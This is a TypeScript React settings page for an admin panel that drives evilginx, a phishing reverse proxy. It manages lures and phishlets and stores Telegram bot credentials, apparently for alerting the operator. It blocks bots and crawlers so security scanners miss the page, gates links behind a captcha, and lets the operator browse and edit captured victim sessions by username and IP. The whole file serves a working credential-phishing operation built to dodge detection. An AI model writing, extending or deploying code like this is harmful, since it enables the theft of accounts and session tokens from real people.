import Layout from "@/components/Layout";
import { useState, useEffect } from "react";
import { toast } from "react-hot-toast";
import { Session } from "@/types";

interface Lure {
  hostname: string;
  id: string;
  info: string;
  og_desc: string;
  og_image: string;
  og_title: string;
  og_url: string;
  path: string;
  paused: number;
  phishlet: string;
  redirect_url: string;
  redirector: string;
  ua_filter: string;
}

export default function Settings() {
  const [settings, setSettings] = useState({
    telegramToken: "",
    telegramChatId: "",
    blockBots: true,
    redirectLink: "",
    useCaptcha: true,
    linkPath: "",
    blacklistedIPs: [] as string[],
    botRedirectLink: "",
    afterLoginRedirect: "",
    expiryDays: 5,
  });
  const [sessions, setSessions] = useState<Session[]>([]);
  const [loading, setLoading] = useState(false);
  const [saving, setSaving] = useState(false);
  const [showClearDbModal, setShowClearDbModal] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [isEditing, setIsEditing] = useState(false);
  const [editedSessions, setEditedSessions] = useState("");
  const [backupFile, setBackupFile] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [lures, setLures] = useState<Lure[]>([]);
  const [selectedLure, setSelectedLure] = useState<Lure | null>(null);

  useEffect(() => {
    const fetchTelegramSettings = async () => {
      try {
        setLoading(true);
        const response = await fetch("/api/telegram-settings");
        if (!response.ok) {
          throw new Error("Failed to fetch Telegram settings");
        }
        const data = await response.json();
        setSettings((prev) => ({
          ...prev,
          telegramToken: data.bot_token || "",
          telegramChatId: data.chat_id || "",
        }));
      } catch (error) {
        console.error("Error loading telegram settings:", error);
        toast.error("Failed to load Telegram settings");
      } finally {
        setLoading(false);
      }
    };

    fetchTelegramSettings();
  }, []);

  useEffect(() => {
    const fetchSessions = async () => {
      try {
        const response = await fetch("/api/database-management");
        if (!response.ok) {
          throw new Error("Failed to fetch sessions");
        }
        const data = await response.json();
        setSessions(data.sessions);
      } catch (error) {
        console.error("Error fetching sessions:", error);
        toast.error("Failed to fetch sessions");
      }
    };

    fetchSessions();
  }, []);

  useEffect(() => {
    const fetchSettings = async () => {
      try {
        setLoading(true);
        // Get saved lure ID from localStorage if it exists
        const savedLureId = localStorage.getItem("selectedLureId");

        const [
          telegramResponse,
          securityResponse,
          linkResponse,
          blacklistResponse,
          luresResponse,
        ] = await Promise.all([
          fetch("/api/telegram-settings"),
          fetch("/api/security-settings"),
          fetch("/api/link-settings"),
          fetch("/api/blacklist"),
          fetch("/api/lures"),
        ]);

        if (
          !telegramResponse.ok ||
          !securityResponse.ok ||
          !linkResponse.ok ||
          !blacklistResponse.ok ||
          !luresResponse.ok
        ) {
          throw new Error("Failed to fetch settings");
        }

        const telegramData = await telegramResponse.json();
        const securityData = await securityResponse.json();
        const linkData = await linkResponse.json();
        const blacklistData = await blacklistResponse.json();
        const luresData = await luresResponse.json();

        setLures(luresData.lures || []);

        // If there are lures available
        if (luresData.lures && luresData.lures.length > 0) {
          let lureToSelect: Lure | null = null;

          // First try to use the saved lure ID from localStorage
          if (savedLureId) {
            const savedLure = luresData.lures.find(
              (lure) => lure.id === savedLureId
            );
            if (savedLure) {
              lureToSelect = savedLure;

              // Fetch the specific lure's full configuration
              try {
                const lureConfigResponse = await fetch(
                  `/api/full-link?lureId=${savedLureId}`
                );
                if (lureConfigResponse.ok) {
                  const lureConfig = await lureConfigResponse.json();

                  // Update link data with the lure-specific configuration
                  linkData.afterLoginRedirect =
                    lureToSelect.redirect_url || linkData.afterLoginRedirect;
                  linkData.useCaptcha = lureToSelect.redirector === "main";

                  // If we have a path in lureConfig, use it
                  if (lureConfig.path) {
                    linkData.linkPath = lureConfig.path;
                  } else {
                    // Otherwise use the path from the lure
                    const cleanPath = lureToSelect.path.startsWith("/")
                      ? lureToSelect.path.substring(1)
                      : lureToSelect.path;
                    linkData.linkPath = cleanPath;
                  }
                }
              } catch (error) {
                console.error("Error fetching lure configuration:", error);
              }
            }
          }

          // If no saved lure found, try to match with current link path
          if (!lureToSelect) {
            const currentLure = luresData.lures.find(
              (lure) =>
                lure.path === `/${linkData.linkPath}` ||
                lure.path === linkData.linkPath
            );

            if (currentLure) {
              lureToSelect = currentLure;
            }
          }

          // Set the selected lure
          if (lureToSelect) {
            setSelectedLure(lureToSelect);
          }
        }

        // Set the settings with the data we have
        setSettings((prev) => ({
          ...prev,
          telegramToken: telegramData.bot_token || "",
          telegramChatId: telegramData.chat_id || "",
          blockBots: securityData.blockBots,
          botRedirectLink: securityData.redirectUrl || "",
          afterLoginRedirect: linkData.afterLoginRedirect || "",
          useCaptcha: linkData.useCaptcha,
          linkPath: linkData.linkPath || "",
          blacklistedIPs: blacklistData.ips || [],
        }));
      } catch (error) {
        console.error("Error loading settings:", error);
        toast.error("Failed to load settings");
      } finally {
        setLoading(false);
      }
    };
    fetchSettings();
  }, []);

  // Enhance the lureChanged event listener to update all form fields completely
  useEffect(() => {
    const handleLureChangedEvent = async (event: CustomEvent) => {
      if (event.detail) {
        const { lureId } = event.detail;
        if (!lureId) return;

        // Find the lure with this ID
        const selected = lures.find((lure) => lure.id === lureId);
        if (!selected) return;

        // Update the selected lure
        setSelectedLure(selected);

        try {
          // Fetch the full configuration for this lure to get all settings
          const lureConfigResponse = await fetch(
            `/api/full-link?lureId=${lureId}`
          );
          if (lureConfigResponse.ok) {
            const lureConfig = await lureConfigResponse.json();

            // Update all settings related to this lure
            setSettings((prev) => {
              // Determine the clean path
              const cleanPath = selected.path.startsWith("/")
                ? selected.path.substring(1)
                : selected.path;

              return {
                ...prev,
                linkPath: lureConfig.path || cleanPath,
                afterLoginRedirect:
                  selected.redirect_url || prev.afterLoginRedirect,
                useCaptcha: selected.redirector === "main",
              };
            });

            // Display a notification that settings form has been updated
            toast.success(
              `Form updated to reflect "${selected.phishlet} - ${selected.path}" settings`
            );
          }
        } catch (error) {
          console.error("Error fetching lure configuration:", error);

          // If API call fails, still update with basic information
          const cleanPath = selected.path.startsWith("/")
            ? selected.path.substring(1)
            : selected.path;

          setSettings((prev) => ({
            ...prev,
            linkPath: cleanPath,
            afterLoginRedirect:
              selected.redirect_url || prev.afterLoginRedirect,
            useCaptcha: selected.redirector === "main",
          }));

          toast.error("Partially updated form with available lure settings");
        }
      }
    };

    // Add the event listener
    window.addEventListener(
      "lureChanged",
      handleLureChangedEvent as EventListener
    );

    // Remove the event listener on cleanup
    return () => {
      window.removeEventListener(
        "lureChanged",
        handleLureChangedEvent as EventListener
      );
    };
  }, [lures]);

  const handleTelegramSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const response = await fetch("/api/telegram-settings", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bot_token: settings.telegramToken || null,
          chat_id: settings.telegramChatId || null,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to update telegram settings");
      }

      // Restart evilginx after updating telegram settings
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);
    } catch (error) {
      console.error("Error:", error);
      setError(error instanceof Error ? error.message : "An error occurred");
      setTimeout(() => setError(null), 3000);
    } finally {
      setLoading(false);
    }
  };

  const handleSecuritySubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setSaving(true);
      const response = await fetch("/api/security-settings", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          blockBots: settings.blockBots,
          redirectUrl: settings.botRedirectLink,
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to update security settings");
      }

      // Restart evilginx after updating security settings
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);

      toast.success("Security settings updated successfully");
    } catch (error) {
      console.error("Error updating security settings:", error);
      toast.error("Failed to update security settings");
    } finally {
      setSaving(false);
    }
  };

  const handleLinkSettingsSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    try {
      setSaving(true);

      // Prepare the request body
      const requestBody = {
        afterLoginRedirect: settings.afterLoginRedirect,
        useCaptcha: settings.useCaptcha,
        linkPath: settings.linkPath,
      };

      // If we have a selected lure, include its ID
      if (selectedLure) {
        // @ts-ignore - Add lureId to the request if we have a selected lure
        requestBody.lureId = selectedLure.id;
      }

      const response = await fetch("/api/link-settings", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(requestBody),
      });

      if (!response.ok) {
        throw new Error("Failed to update link settings");
      }

      // Restart evilginx after updating link settings
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      // Update the localStorage with the selected lure ID if applicable
      if (selectedLure) {
        localStorage.setItem("selectedLureId", selectedLure.id);
      }

      // Emit a custom event that the index page can listen to
      const event = new CustomEvent("linkSettingsUpdated", {
        detail: {
          lureId: selectedLure?.id,
          settings: requestBody,
        },
      });
      window.dispatchEvent(event);

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);

      toast.success("Link settings updated successfully");
    } catch (error) {
      console.error("Error updating link settings:", error);
      toast.error("Failed to update link settings");
    } finally {
      setSaving(false);
    }
  };

  const handleBlacklistSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      const ips = settings.blacklistedIPs
        .join("\n")
        .split("\n")
        .map((ip) => ip.trim())
        .filter((ip) => ip !== "");

      const response = await fetch("/api/blacklist", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ ips }),
      });

      if (!response.ok) {
        throw new Error("Failed to update blacklist");
      }

      // Restart evilginx after updating blacklist
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);
    } catch (error) {
      console.error("Error:", error);
      setError(error instanceof Error ? error.message : "An error occurred");
      setTimeout(() => setError(null), 3000);
    } finally {
      setLoading(false);
    }
  };

  const handleClearBlacklist = async () => {
    try {
      setSaving(true);
      const response = await fetch("/api/blacklist", {
        method: "DELETE",
      });

      if (!response.ok) {
        throw new Error("Failed to clear blacklist");
      }

      setSettings((prev) => ({ ...prev, blacklistedIPs: [] }));

      // Restart evilginx after clearing blacklist
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);

      toast.success("Blacklist cleared successfully");
    } catch (error) {
      console.error("Error clearing blacklist:", error);
      toast.error("Failed to clear blacklist");
    } finally {
      setSaving(false);
    }
  };

  const handleClearDatabase = async () => {
    try {
      setSaving(true);
      const response = await fetch("/api/database-management", {
        method: "DELETE",
      });

      if (!response.ok) {
        throw new Error("Failed to clear database");
      }

      const data = await response.json();
      setSessions([]);
      setBackupFile(data.backupFile);
      setShowClearDbModal(false);

      // Restart evilginx after clearing database
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);

      toast.success(
        "Database cleared successfully. Changes applied to .evilginx data.db"
      );
    } catch (error) {
      console.error("Error clearing database:", error);
      toast.error("Failed to clear database");
    } finally {
      setSaving(false);
    }
  };

  const handleRefreshSessions = async () => {
    try {
      setLoading(true);
      const response = await fetch("/api/database-management");
      if (!response.ok) {
        throw new Error("Failed to fetch sessions");
      }
      const data = await response.json();
      setSessions(data.sessions);
      toast.success("Database refreshed successfully");
    } catch (error) {
      console.error("Error refreshing sessions:", error);
      toast.error("Failed to refresh sessions");
    } finally {
      setLoading(false);
    }
  };

  const handleEditSessions = () => {
    setIsEditing(true);
    setEditedSessions(JSON.stringify(sessions, null, 2));
  };

  const handleSaveEdit = async () => {
    try {
      setSaving(true);
      let parsedSessions;
      try {
        parsedSessions = JSON.parse(editedSessions);
      } catch {
        toast.error("Invalid JSON format");
        return;
      }

      const response = await fetch("/api/database-management", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessions: parsedSessions }),
      });

      if (!response.ok) {
        throw new Error("Failed to update sessions");
      }

      setSessions(parsedSessions);
      setIsEditing(false);

      // Restart evilginx after updating database
      await fetch("/api/restart-evilginx", {
        method: "POST",
      });

      setShowSuccess(true);
      setTimeout(() => setShowSuccess(false), 3000);

      toast.success(
        "Sessions updated successfully. Changes applied to .evilginx data.db"
      );
    } catch (error) {
      console.error("Error updating sessions:", error);
      toast.error("Failed to update sessions");
    } finally {
      setSaving(false);
    }
  };

  const filteredSessions = sessions.filter((session) => {
    const searchLower = searchQuery.toLowerCase();
    return (
      session.username.toLowerCase().includes(searchLower) ||
      session.phishlet.toLowerCase().includes(searchLower) ||
      session.remote_addr.toLowerCase().includes(searchLower)
    );
  });

  if (loading) {
    return (
      <Layout>
        <div className="flex items-center justify-center h-screen">
          <div className="animate-spin rounded-full h-32 w-32 border-b-2 border-indigo-500"></div>
        </div>
      </Layout>
    );
  }

  return (
    <Layout>
      <div className="space-y-6">
        {error && (
          <div className="bg-red-500 text-white p-4 rounded-lg">{error}</div>
        )}

        {showSuccess && (
          <div className="bg-green-500 text-white p-4 rounded-lg">
            Settings updated successfully!
          </div>
        )}

        <section className="bg-[#232A34] rounded-lg p-6">
          <h2 className="text-white text-xl mb-4">Telegram Settings</h2>
          <form onSubmit={handleTelegramSubmit} className="space-y-4">
            <div>
              <label className="block text-gray-400 mb-2">
                Telegram Bot Token
              </label>
              <input
                type="text"
                data-allow-select="true"
                className="w-full bg-[#1B2028] text-white p-3 rounded"
                value={settings.telegramToken}
                onChange={(e) =>
                  setSettings({ ...settings, telegramToken: e.target.value })
                }
                placeholder="Enter your Telegram bot token"
              />
            </div>
            <div>
              <label className="block text-gray-400 mb-2">
                Telegram Chat ID
              </label>
              <input
                type="text"
                data-allow-select="true"
                className="w-full bg-[#1B2028] text-white p-3 rounded"
                value={settings.telegramChatId}
                onChange={(e) =>
                  setSettings({ ...settings, telegramChatId: e.target.value })
                }
                placeholder="Enter your Telegram chat ID"
              />
            </div>
            <button
              type="submit"
              disabled={saving}
              className={`bg-indigo-500 text-white px-6 py-2 rounded ${
                saving ? "opacity-50 cursor-not-allowed" : "hover:bg-indigo-600"
              } transition-colors`}
            >
              {saving ? "Saving..." : "Save Telegram Settings"}
            </button>
          </form>
        </section>

        <section className="bg-[#232A34] rounded-lg p-6">
          <h2 className="text-white text-xl mb-4">Link Security Settings</h2>
          <form onSubmit={handleSecuritySubmit} className="space-y-4">
            <div>
              <h3 className="text-gray-400 mb-3">Blacklist Settings</h3>
              <div className="space-y-2">
                <label className="flex items-center space-x-2">
                  <input
                    type="radio"
                    data-allow-select="true"
                    checked={settings.blockBots}
                    onChange={() =>
                      setSettings({ ...settings, blockBots: true })
                    }
                    className="text-indigo-500"
                  />
                  <span className="text-gray-400">
                    Block All Bots And Crawlers
                  </span>
                </label>
                <label className="flex items-center space-x-2">
                  <input
                    type="radio"
                    data-allow-select="true"
                    checked={!settings.blockBots}
                    onChange={() =>
                      setSettings({ ...settings, blockBots: false })
                    }
                    className="text-indigo-500"
                  />
                  <span className="text-gray-400">Do Not Block Bots</span>
                </label>
              </div>
            </div>

            <div>
              <label className="block text-gray-400 mb-2">
                Redirect URL for Blocked IPs
              </label>
              <input
                type="text"
                data-allow-select="true"
                className="w-full bg-[#1B2028] text-white p-3 rounded"
                value={settings.botRedirectLink}
                onChange={(e) =>
                  setSettings({ ...settings, botRedirectLink: e.target.value })
                }
                placeholder="https://example.com"
              />
            </div>

            <button
              type="submit"
              disabled={saving}
              className={`bg-indigo-500 text-white px-6 py-2 rounded ${
                saving ? "opacity-50 cursor-not-allowed" : "hover:bg-indigo-600"
              } transition-colors`}
            >
              {saving ? "Saving..." : "Save Changes"}
            </button>
          </form>
        </section>

        <section className="bg-[#232A34] rounded-lg p-6">
          <h2 className="text-white text-xl mb-4">Link Settings</h2>
          <form onSubmit={handleLinkSettingsSubmit} className="space-y-4">
            <div>
              <label className="block text-gray-400 mb-2">
                After Login Redirect URL
              </label>
              <input
                type="text"
                data-allow-select="true"
                className="w-full bg-[#1B2028] text-white p-3 rounded"
                value={settings.afterLoginRedirect}
                onChange={(e) =>
                  setSettings({
                    ...settings,
                    afterLoginRedirect: e.target.value,
                  })
                }
                placeholder="https://example.com"
              />
            </div>

            <div>
              <h3 className="text-gray-400 mb-3">Captcha Settings</h3>
              <div className="space-y-2">
                <label className="flex items-center space-x-2">
                  <input
                    type="radio"
                    data-allow-select="true"
                    checked={settings.useCaptcha}
                    onChange={() =>
                      setSettings({ ...settings, useCaptcha: true })
                    }
                    className="text-indigo-500"
                  />
                  <span className="text-gray-400">Use Cloudflare Captcha</span>
                </label>
                <label className="flex items-center space-x-2">
                  <input
                    type="radio"
                    data-allow-select="true"
                    checked={!settings.useCaptcha}
                    onChange={() =>
                      setSettings({ ...settings, useCaptcha: false })
                    }
                    className="text-indigo-500"
                  />
                  <span className="text-gray-400">Do Not Use Captcha</span>
                </label>
              </div>
            </div>

            <div>
              <label className="block text-gray-400 mb-2">Link Path</label>
              <input
                type="text"
                data-allow-select="true"
                className="w-full bg-[#1B2028] text-white p-3 rounded"
                value={settings.linkPath}
                onChange={(e) =>
                  setSettings({
                    ...settings,
                    linkPath: e.target.value.replace(/^\/+/, ""),
                  })
                }
                placeholder="Enter path (without leading /)"
              />
              <p className="text-xs text-gray-500 mt-1">
                The path will always start with "/" in the system
              </p>
              {selectedLure && (
                <p className="text-xs text-indigo-400 mt-1">
                  Currently editing: {selectedLure.phishlet} -{" "}
                  {selectedLure.path}
                </p>
              )}
            </div>

            <button
              type="submit"
              disabled={saving}
              className={`bg-indigo-500 text-white px-6 py-2 rounded ${
                saving ? "opacity-50 cursor-not-allowed" : "hover:bg-indigo-600"
              } transition-colors`}
            >
              {saving ? "Saving..." : "Save Changes"}
            </button>
          </form>
        </section>

        <section className="bg-[#232A34] rounded-lg p-6">
          <h2 className="text-white text-xl mb-4">Blacklist Management</h2>
          <form onSubmit={handleBlacklistSubmit} className="space-y-4">
            <div>
              <label className="block text-gray-400 mb-2">
                Blacklisted IP Addresses
              </label>
              <textarea
                data-allow-select="true"
                className="w-full bg-[#1B2028] text-white p-3 rounded h-64 font-mono"
                value={
                  Array.isArray(settings.blacklistedIPs)
                    ? settings.blacklistedIPs.join("\n")
                    : ""
                }
                onChange={(e) =>
                  setSettings({
                    ...settings,
                    blacklistedIPs: e.target.value.split("\n"),
                  })
                }
                placeholder="Enter IP addresses (one per line)"
              />
            </div>

            <div className="flex space-x-4">
              <button
                type="submit"
                disabled={saving}
                className={`bg-indigo-500 text-white px-6 py-2 rounded ${
                  saving
                    ? "opacity-50 cursor-not-allowed"
                    : "hover:bg-indigo-600"
                } transition-colors`}
              >
                {saving ? "Saving..." : "Save Changes"}
              </button>

              <button
                type="button"
                onClick={handleClearBlacklist}
                disabled={saving}
                className={`bg-red-500 text-white px-6 py-2 rounded ${
                  saving ? "opacity-50 cursor-not-allowed" : "hover:bg-red-600"
                } transition-colors`}
              >
                {saving ? "Clearing..." : "Clear List"}
              </button>
            </div>
          </form>
        </section>

        <section className="bg-[#232A34] rounded-lg p-6">
          <h2 className="text-white text-xl mb-4">Database Management</h2>
          <div className="space-y-4">
            <p className="text-gray-400 text-sm mb-4">
              All changes to the database are automatically synchronized with
              the .evilginx directory through symlinks. When you edit or clear
              the database, the changes will be applied to both the
              panel/data/data.db and .evilginx/data.db files.
            </p>
            <div className="flex items-center space-x-4 mb-4">
              <button
                onClick={handleRefreshSessions}
                disabled={loading}
                className={`bg-indigo-500 text-white px-4 py-2 rounded ${
                  loading
                    ? "opacity-50 cursor-not-allowed"
                    : "hover:bg-indigo-600"
                } transition-colors`}
              >
                {loading ? "Refreshing..." : "Refresh Database"}
              </button>

              {backupFile && (
                <a
                  href={`/data/backup/${backupFile}`}
                  download
                  className="bg-green-500 text-white px-4 py-2 rounded hover:bg-green-600 transition-colors"
                >
                  Download Backup
                </a>
              )}
            </div>

            <div className="mb-4">
              <input
                type="text"
                placeholder="Search database..."
                className="w-full bg-[#1B2028] text-white p-3 rounded"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
              />
            </div>

            <div>
              <label className="block text-gray-400 mb-2">
                Database Content
              </label>
              {isEditing ? (
                <>
                  <textarea
                    data-allow-select="true"
                    className="w-full bg-[#1B2028] text-white p-3 rounded h-64 font-mono"
                    value={editedSessions}
                    onChange={(e) => setEditedSessions(e.target.value)}
                  />
                  <div className="mt-2 space-x-2">
                    <button
                      onClick={handleSaveEdit}
                      disabled={saving}
                      className={`bg-green-500 text-white px-4 py-2 rounded ${
                        saving
                          ? "opacity-50 cursor-not-allowed"
                          : "hover:bg-green-600"
                      } transition-colors`}
                    >
                      {saving ? "Saving..." : "Save Changes"}
                    </button>
                    <button
                      onClick={() => setIsEditing(false)}
                      className="bg-gray-500 text-white px-4 py-2 rounded hover:bg-gray-600 transition-colors"
                    >
                      Cancel
                    </button>
                  </div>
                </>
              ) : (
                <>
                  <textarea
                    data-allow-select="true"
                    className="w-full bg-[#1B2028] text-white p-3 rounded h-64 font-mono"
                    value={JSON.stringify(filteredSessions, null, 2)}
                    readOnly
                  />
                  <div className="mt-2">
                    <button
                      onClick={handleEditSessions}
                      className="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600 transition-colors"
                    >
                      Edit Database
                    </button>
                  </div>
                </>
              )}
            </div>

            <div className="flex space-x-4">
              <button
                type="button"
                onClick={() => setShowClearDbModal(true)}
                disabled={saving}
                className={`bg-red-500 text-white px-6 py-2 rounded ${
                  saving ? "opacity-50 cursor-not-allowed" : "hover:bg-red-600"
                } transition-colors`}
              >
                {saving ? "Clearing..." : "Clear Database"}
              </button>
            </div>
          </div>
        </section>

        {/* Clear Database Confirmation Modal */}
        {showClearDbModal && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div className="bg-[#232A34] p-6 rounded-lg max-w-md w-full mx-4">
              <h3 className="text-white text-xl mb-4">
                Confirm Database Clear
              </h3>
              <p className="text-gray-400 mb-6">
                Are you sure you want to clear the database? This action cannot
                be undone.
              </p>
              <div className="flex space-x-4">
                <button
                  onClick={handleClearDatabase}
                  disabled={saving}
                  className={`bg-red-500 text-white px-6 py-2 rounded ${
                    saving
                      ? "opacity-50 cursor-not-allowed"
                      : "hover:bg-red-600"
                  } transition-colors`}
                >
                  {saving ? "Clearing..." : "Clear Database"}
                </button>
                <button
                  onClick={() => setShowClearDbModal(false)}
                  className="bg-gray-600 text-white px-6 py-2 rounded hover:bg-gray-700 transition-colors"
                >
                  Cancel
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </Layout>
  );
}
